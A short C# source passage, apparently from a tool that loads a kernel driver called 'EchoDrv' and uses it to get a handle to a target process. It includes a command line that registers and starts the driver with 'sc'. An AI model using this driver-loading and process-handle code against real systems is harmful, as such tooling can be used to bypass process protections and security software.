                Console.WriteLine("[-] Failed loading Driver! Maybe already loaded or try to manualy load it:\nsc create EchoDrv binpath=C:\\PathToDriver.sys type=kernel && sc start EchoDrv");
                return false;
            }

            return true;
        }

        public static bool Initialize(out IntPtr TargetProcHandle, out IntPtr Drvhandle)
        {
            TargetProcHandle = IntPtr.Zero;
            Drvhandle = IntPtr.Zero;

            if (!GetDriverHandle("EchoDrv", out Drvhandle))
                return false;

            TargetProcHandle = initEchoDrv();
            if (TargetProcHandle == IntPtr.Zero)
                return false;

            return true;
        }
    }
}
